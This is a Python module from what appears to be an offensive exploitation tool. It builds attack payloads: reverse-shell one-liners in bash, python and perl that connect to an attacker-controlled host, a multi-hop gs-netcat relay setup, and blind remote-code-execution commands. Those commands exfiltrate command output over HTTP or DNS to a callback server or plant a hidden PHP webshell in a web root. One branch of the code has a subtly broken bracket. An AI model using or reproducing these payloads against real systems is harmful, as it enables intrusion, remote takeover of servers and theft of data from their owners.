"""
core/payload.py — Payload builders.
Covers: build_reverse_shell_cmd, build_l2_payload, show_l2relay_panel,
        build_blind_rce_cmd
"""
from __future__ import annotations

import sys

from config import GSRN_HOST, GSRN_PORT, _GS_VER, _GS_CONN


# ─── TUI colour helpers (re-used from ui, but we keep a minimal local copy
#     to avoid a circular import when payload.py is imported early) ─────────────
import os as _os
_IS_TTY = sys.stdout.isatty()
def _c(code: str) -> str:
    return code if _IS_TTY else ""
_RST  = _c("\033[0m");  _BOLD = _c("\033[1m");  _DIM  = _c("\033[2m")
_CYAN = _c("\033[36m"); _YLW  = _c("\033[33m"); _GRN  = _c("\033[32m")
_RED  = _c("\033[31m"); _BLU  = _c("\033[34m"); _MAG  = _c("\033[35m")


def build_reverse_shell_cmd(lhost: str, lport: int) -> str:
    """Classic python3 reverse shell one-liner."""
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    )


def build_l2_payload(l2_ip: str, l2_port: int) -> str:
    """
    Reverse shell payload that connects to an L2 relay machine (not local listener).
    Fallback chain: bash /dev/tcp → python3 socket → python socket → perl Socket.
    """
    bash = f"bash -i >& /dev/tcp/{l2_ip}/{l2_port} 0>&1"
    py3 = (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{l2_ip}\",{l2_port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    )
    py2 = py3.replace("python3", "python")
    perl = (
        f"perl -e 'use Socket;"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"connect(S,sockaddr_in({l2_port},inet_aton(\"{l2_ip}\")));"
        f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        f"exec(\"/bin/sh -i\");'"
    )
    return (
        f"bash -c '{bash}' 2>/dev/null || "
        f"{py3} 2>/dev/null || "
        f"{py2} 2>/dev/null || "
        f"{perl}"
    )


def show_l2relay_panel(l2_ip: str, l2_port: int,
                       l1_token: str, l2_secret: str,
                       payload: str) -> None:
    """Print a summary panel for L2 relay mode."""
    from ui.output import _print_panel as _pp  # type: ignore[import]
    sep = "=" * 56
    tok = l1_token or "(not provided)"
    sec = l2_secret or "(not provided)"
    payload_preview = payload[:90] + ("..." if len(payload) > 90 else "")
    lines = "\n".join([
        sep,
        "           GSOCKET RELAY — INJECT READY",
        sep,
        f"  {_YLW}L1 Token (GSocket){_RST} : {_CYAN}{_BOLD}{tok}{_RST}",
        f"  {_YLW}L2 Local Secret   {_RST} : {_CYAN}{sec}{_RST}",
        f"  {_YLW}Relay IP          {_RST} : {l2_ip}",
        f"  {_YLW}Relay Port        {_RST} : {l2_port}",
        sep,
        f"  {_BOLD}COMMANDS{_RST}",
        sep,
        f"  {_YLW}[L1]{_RST} gs-netcat -l -s \"{_CYAN}{tok}{_RST}\"",
        "",
        f"  {_YLW}[L2]{_RST} gs-netcat -l -p {l2_port} -s \"{_CYAN}{sec}{_RST}\" |",
        f"       gs-netcat -s \"{_CYAN}{tok}{_RST}\"",
        "",
        f"  {_YLW}[L3]{_RST} {_DIM}(injected via RCE → connects to L2){_RST}",
        f"  {_DIM}{payload_preview}{_RST}",
        sep,
    ])
    try:
        _pp(lines, title="L2 Relay Setup")
    except Exception:
        print(lines)


def build_blind_rce_cmd(base_cmd: str, callback_ip: str, callback_port: int,
                        method: str = "http", domain: str = "") -> str:
    """
    Build blind RCE command for OOB exfiltration.
    method: "dns" | "http" | "reverse" | "webshell" | default
    """
    if method == "dns":
        return (
            f'curl -s "http://{callback_ip}:{callback_port}/cmd" | '
            f'while read line; do '
            f'nslookup "$(echo $line | base64).{domain}" {callback_ip} 2>/dev/null; '
            f'done'
        )
    elif method == "http":
        return (
            f'curl -s -X POST -d "$({base_cmd})" '
            f'http://{callback_ip}:{callback_port}/output'
        )
    elif method == "reverse":
        dq = '\\"'
        sq = "\\'"
        return (
            f'python3 -c "import socket,subprocess,os;'
            f's=socket.socket();s.connect(({dq}{callback_ip}{dq},{callback_port}));'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call([{sq}/bin/sh{sq},{sq}-i{sq})]"'
        )
    elif method == "webshell":
        shell_code = f'<?php if(isset($_GET["c"])) {{ system($_GET["c"]); }} ?>'
        return (
            f'echo "{shell_code}" > /var/www/html/.hidden.php && '
            f'echo "Shell at http://{callback_ip}/.hidden.php?c=id"'
        )
    else:
        return f'curl -s "http://{callback_ip}:{callback_port}/?output=$({base_cmd})"'
